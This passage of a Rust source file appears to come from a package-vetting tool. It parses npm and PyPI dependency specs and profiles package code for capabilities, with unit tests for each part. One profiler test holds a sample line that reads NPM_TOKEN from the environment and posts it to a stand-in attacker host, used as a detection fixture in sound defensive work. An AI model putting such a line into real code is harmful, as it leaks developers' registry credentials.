    requires_dist: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct PypiRoot {
    info: PypiInfo,
    releases: BTreeMap<String, Vec<PypiFile>>,
}

#[derive(Debug, Deserialize)]
struct PypiFile {
    filename: String,
    packagetype: String,
    url: String,
    digests: PypiDigests,
    #[serde(default)]
    requires_python: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PypiDigests {
    sha256: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_npm_specs() {
        let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Npm);
        assert_eq!(spec.name, "left-pad");
        assert_eq!(spec.version.as_deref(), Some("1.3.0"));

        let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
        assert_eq!(spec.name, "@scope/pkg");
        assert_eq!(spec.version.as_deref(), Some("2.0.0"));
    }

    #[test]
    fn parses_pypi_specs() {
        let spec = PackageSpec::parse("pypi:requests==2.32.3").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Pypi);
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert!(spec.extras.is_empty());

        let spec = PackageSpec::parse("pypi:six@1.16.0").unwrap();
        assert_eq!(spec.name, "six");
        assert_eq!(spec.version.as_deref(), Some("1.16.0"));

        let spec = PackageSpec::parse("pypi:urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        let spec = PackageSpec::parse("pypi:requests[socks,security]==2.32.3").unwrap();
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert_eq!(
            spec.extras,
            BTreeSet::from(["security".to_owned(), "socks".to_owned()])
        );
        assert_eq!(spec.package_key(), "pypi:requests[security,socks]");
    }

    #[test]
    fn resolves_common_npm_ranges() {
        assert!(npm_version_satisfies("6.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("6.1.2", "^6.0.0"));
        assert!(!npm_version_satisfies("7.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("1.2.9", "~1.2.0"));
        assert!(!npm_version_satisfies("1.3.0", "~1.2.0"));
    }

    #[test]
    fn parses_npm_alias_requirements() {
        let spec = PackageSpec {
            ecosystem: Ecosystem::Npm,
            name: "string-width-cjs".to_owned(),
            version: Some("npm:string-width@^4.2.0".to_owned()),
            extras: BTreeSet::new(),
        };
        let (registry_name, requirement) = npm_registry_name_and_requirement(&spec).unwrap();
        assert_eq!(registry_name, "string-width");
        assert_eq!(requirement.as_deref(), Some("^4.2.0"));
    }

    #[test]
    fn reads_project_package_json_specs() {
        let dir = tempfile::tempdir().unwrap();
        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "dependencies": { "is-odd": "3.0.1" },
                "devDependencies": { "which": "^2.0.2" },
                "optionalDependencies": { "is-even": "1.0.0" },
                "peerDependencies": {
                    "left-pad": "1.3.0",
                    "optional-peer": "1.0.0"
                },
                "peerDependenciesMeta": {
                    "optional-peer": { "optional": true }
                }
            }"#,
        )
        .unwrap();
        let specs = read_package_json_specs(&package_json).unwrap();
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "which" && spec.version.as_deref() == Some("^2.0.2")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-even" && spec.version.as_deref() == Some("1.0.0")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("1.3.0")));
        assert!(!specs.iter().any(|spec| spec.name == "optional-peer"));
    }

    #[test]
    fn reads_npm_runtime_optional_and_peer_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
            },
            scripts: None,
            dependencies: Some(BTreeMap::from([(
                "runtime".to_owned(),
                "^1.0.0".to_owned(),
            )])),
            optional_dependencies: Some(BTreeMap::from([(
                "optional-runtime".to_owned(),
                "^2.0.0".to_owned(),
            )])),
            peer_dependencies: Some(BTreeMap::from([
                ("required-peer".to_owned(), "^3.0.0".to_owned()),
                ("optional-peer".to_owned(), "^4.0.0".to_owned()),
            ])),
            peer_dependencies_meta: Some(BTreeMap::from([(
                "optional-peer".to_owned(),
                NpmPeerDependencyMeta { optional: true },
            )])),
        };

        let dependencies = npm_runtime_dependencies(&version_doc);
        assert!(dependencies
            .iter()
            .any(|spec| spec.name == "runtime" && spec.version.as_deref() == Some("^1.0.0")));
        assert!(dependencies.iter().any(
            |spec| spec.name == "optional-runtime" && spec.version.as_deref() == Some("^2.0.0")
        ));
        assert!(dependencies
            .iter()
            .any(|spec| spec.name == "required-peer" && spec.version.as_deref() == Some("^3.0.0")));
        assert!(!dependencies.iter().any(|spec| spec.name == "optional-peer"));
    }

    #[test]
    fn reads_requirements_specs() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let nested = dir.path().join("nested.txt");
        let constraints = dir.path().join("constraints.txt");
        fs::write(&nested, "charset-normalizer==3.4.0\n").unwrap();
        fs::write(&constraints, "urllib3==2.2.1\n").unwrap();
        fs::write(
            &requirements,
            "requests[socks]==2.32.3\n# ignored\nidna>=2,<4\n-r nested.txt\n-c constraints.txt\ncolorama; extra == 'windows'\n",
        )
        .unwrap();
        let discovered = read_requirements_file(&requirements).unwrap();
        let specs = discovered.specs;
        assert!(specs.iter().any(|spec| spec.name == "requests"
            && spec.version.as_deref() == Some("==2.32.3")
            && spec.extras.contains("socks")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2,<4")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"
                && spec.version.as_deref() == Some("==3.4.0")));
        assert!(!specs.iter().any(|spec| spec.name == "colorama"));
        assert_eq!(specs.len(), 3);
        assert_eq!(
            discovered
                .constraints
                .get("pypi:urllib3")
                .map(String::as_str),
            Some("==2.2.1")
        );
    }

    #[test]
    fn parses_pypi_requires_dist_with_extras() {
        let spec = parse_pypi_requirement("urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        assert!(parse_pypi_requirement("PySocks>=1.5.6; extra == 'socks'").is_none());

        let extras = BTreeSet::from(["socks".to_owned()]);
        let spec = parse_pypi_requirement_with_extras("PySocks>=1.5.6; extra == 'socks'", &extras)
            .unwrap();
        assert_eq!(spec.name, "pysocks");
        assert_eq!(spec.version.as_deref(), Some(">=1.5.6"));
    }

    #[test]
    fn merges_pypi_constraints_into_requirements() {
        let spec = PackageSpec::new(Ecosystem::Pypi, "urllib3", Some("<3,>=1.21.1".to_owned()));
        let constraints = BTreeMap::from([("pypi:urllib3".to_owned(), "==2.2.1".to_owned())]);
        assert_eq!(
            constrained_pypi_requirement(&spec, &constraints).as_deref(),
            Some("<3,>=1.21.1,==2.2.1")
        );
    }

    #[test]
    fn evaluates_common_pypi_markers() {
        let env = PypiMarkerEnvironment {
            python_full_version: Some("3.11.4".to_owned()),
            os_name: "posix".to_owned(),
            sys_platform: "darwin".to_owned(),
            platform_system: "Darwin".to_owned(),
            platform_machine: "arm64".to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        };

        assert_eq!(
            evaluate_pypi_marker("python_version >= '3.0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("python_version < '0'", &env),
            Some(false)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'posix' or python_version < '0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'nt' and python_version >= '3.0'", &env),
            Some(false)
        );
    }

    #[test]
    fn applies_requires_python_constraints() {
        let file = PypiFile {
            filename: "pkg.whl".to_owned(),
            packagetype: "bdist_wheel".to_owned(),
            url: "https://example.invalid/pkg.whl".to_owned(),
            digests: PypiDigests {
                sha256: "abc".to_owned(),
            },
            requires_python: Some(">=3.10".to_owned()),
        };
        assert!(!pypi_file_python_compatible(&file, Some("3.9.6")));
        assert!(pypi_file_python_compatible(&file, Some("3.11.0")));
    }

    #[test]
    fn profiler_turns_host_access_into_capabilities() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file(
            "index.js",
            "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
        );
        let profile = profiler.finish();
        assert!(profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::EnvRead));
        assert!(profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::HttpRequest));
    }

    #[test]
    fn profiler_ignores_tests_and_packaging_files() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
        profiler.scan_file("pkg/setup.py", "open('README.md').read()");
        let profile = profiler.finish();
        assert!(profile.capabilities.is_empty());
        assert_eq!(profile.files_scanned, 0);
    }

    #[test]
    fn parses_console_script_entry_points() {
        let entries = parse_console_scripts(
            r#"
            [console_scripts]
            normalizer = charset_normalizer.cli.normalizer:cli_detect

            [gui_scripts]
            ignored = ignored:main
            "#,
        );
        assert_eq!(
            entries,
            vec![PythonEntryPoint {
                name: "normalizer".to_owned(),
                module: "charset_normalizer.cli.normalizer".to_owned(),
                function: "cli_detect".to_owned(),
            }]
        );
    }

    #[test]
    fn parses_capability_grants() {
        assert_eq!(
            parse_capability_grant("http:api.example.com").unwrap(),
            Capability::HttpHost("api.example.com".to_owned())
        );
        assert_eq!(
            parse_capability_grant("env:API_TOKEN").unwrap(),
            Capability::EnvRead("API_TOKEN".to_owned())
        );
        assert_eq!(
            parse_capability_grant("dynamic-eval").unwrap(),
            Capability::DynamicEval
        );
    }

    #[test]
    fn generated_profile_module_rejects_capabilities_by_default() {
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
            filename: "date-helper.tgz".to_owned(),
            expected_sha256: None,
            npm_scripts: BTreeMap::new(),
            dependencies: Vec::new(),
        };
        let findings = vec![CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }];
        let module = module_from_profile(&package, &findings);
        let error = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(error
            .findings
            .iter()
            .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
    }
}
